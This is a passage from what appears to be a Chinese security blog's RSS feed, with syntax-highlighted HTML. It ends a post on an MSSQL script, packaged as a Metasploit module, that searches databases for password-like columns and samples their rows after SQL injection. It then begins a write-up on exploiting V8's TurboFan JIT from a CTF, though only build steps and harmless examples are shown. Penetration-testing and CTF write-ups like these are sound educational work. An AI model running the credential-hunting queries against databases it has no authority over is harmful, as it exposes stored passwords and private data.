&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WHERE (lower(sys.columns.name) LIKE &amp;#39;&amp;#39;%password%&amp;#39;&amp;#39; OR &amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- 其他敏感词匹配条件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FETCH&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;NEXT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_cursor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;INTO&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbname&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该脚本会遍历每个数据库的模式和表，输出敏感字段的位置和数据类型。经测试兼容MSSQL 2005/2008，但需要调整才能支持2000版本。&lt;/p&gt;
&lt;p&gt;为了帮助审计人员快速判断数据价值，我增加了数据采样功能。由于MSSQL没有MySQL的LIMIT语法，采用以下方案获取首、中、尾三条记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;DECLARE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;目标表&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IF&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BEGIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- 使用ROW_NUMBER()实现分页采样
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WITH&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ROW_NUMBER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OVER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ORDER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;字段&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rownumber&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;表&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rownumber&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;最终我将这些功能整合成Metasploit模块&amp;quot;MSSQL Interesting Data Finder&amp;quot;。当前版本因框架限制暂不支持：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据采样功能（底层模块存在bug）&lt;/li&gt;
&lt;li&gt;Windows身份验证（仅支持SQL认证）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;未来方向&#34;&gt;未来方向
&lt;/h2&gt;&lt;p&gt;该技术可扩展至MySQL/PostgreSQL/Oracle等数据库。MySQL版本已在开发计划中，其他数据库的实现留给读者作为练习。&lt;/p&gt;
&lt;h2 id=&#34;致谢&#34;&gt;致谢
&lt;/h2&gt;&lt;p&gt;特别感谢Justin Clarke的著作启发，促使我在渗透测试中更深入地挖掘SQL注入漏洞。唯一遗憾的是需要更多时间读完这本佳作！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入解析V8引擎TurboFan的漏洞利用技术</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90v8%E5%BC%95%E6%93%8Eturbofan%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sun, 03 Aug 2025 08:12:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90v8%E5%BC%95%E6%93%8Eturbofan%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;引言&#34;&gt;引言
&lt;/h1&gt;&lt;p&gt;很久以前我写过一篇关于内核池的博客文章，今年我们要在节点的海洋中畅游！当前趋势是攻击JavaScript引擎，特别是优化JIT编译器，如V8的TurboFan、SpiderMonkey的IonMonkey、JavaScriptCore的DFG &amp;amp; FTL或Chakra的SimpleJIT &amp;amp; FullJIT。&lt;/p&gt;
&lt;p&gt;本文将重点讨论TurboFan及其使用的&amp;quot;节点海洋&amp;quot;结构。然后，我们将研究Google CTF 2018中由@_tsuro编写的一个易受攻击的优化通道，并为其编写漏洞利用代码。我们将在x64 Linux机器上进行操作，但在Windows平台上的利用过程完全相同（只需使用不同的shellcode！）。&lt;/p&gt;
&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建
&lt;/h1&gt;&lt;h2 id=&#34;构建v8&#34;&gt;构建V8
&lt;/h2&gt;&lt;p&gt;构建V8非常简单。您可以使用depot工具获取源代码，然后使用以下命令构建：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fetch v8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gclient sync
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./build/install-build-deps.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tools/dev/gm.py x64.release
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;请注意，每当您更新源代码或检出特定提交时，请运行&lt;code&gt;gclient sync&lt;/code&gt;，否则可能无法正确构建。&lt;/p&gt;
&lt;h2 id=&#34;d8-shell&#34;&gt;d8 shell
&lt;/h2&gt;&lt;p&gt;引擎提供了一个非常方便的shell称为d8。为了加快构建速度，可以将编译限制在此shell：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;~/v8$ ./tools/dev/gm.py x64.release d8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;尝试运行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;~/v8$ ./out/x64.release/d8 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;V8 version 7.3.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;candidate&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;d8&amp;gt; print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hello doare&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hello doare
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;turbofan编译管道&#34;&gt;TurboFan编译管道
&lt;/h1&gt;&lt;p&gt;让我们看以下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ceil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以使用&lt;code&gt;--trace-opt&lt;/code&gt;跟踪优化，并观察到函数f最终会被TurboFan优化。&lt;/p&gt;
&lt;h1 id=&#34;节点海洋&#34;&gt;节点海洋
&lt;/h1&gt;&lt;p&gt;简单介绍一下节点海洋。TurboFan使用称为&amp;quot;节点海洋&amp;quot;的程序表示。节点可以表示算术运算、加载、存储、调用、常量等。有三种类型的边：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;控制边：与控制流图中的边相同，用于分支和循环&lt;/li&gt;
&lt;li&gt;值边：数据流图中的边，显示值依赖关系&lt;/li&gt;
&lt;li&gt;效果边：对读取或写入状态等操作进行排序&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;实验优化阶段&#34;&gt;实验优化阶段
&lt;/h1&gt;&lt;p&gt;在本文中，我们想重点了解V8如何使用TurboFan生成优化代码。如前所述，TurboFan使用节点海洋，我们想了解这个图如何通过所有优化而演变。&lt;/p&gt;
&lt;h2 id=&#34;处理numberadd&#34;&gt;处理NumberAdd
&lt;/h2&gt;&lt;p&gt;考虑以下函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;opt_me&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
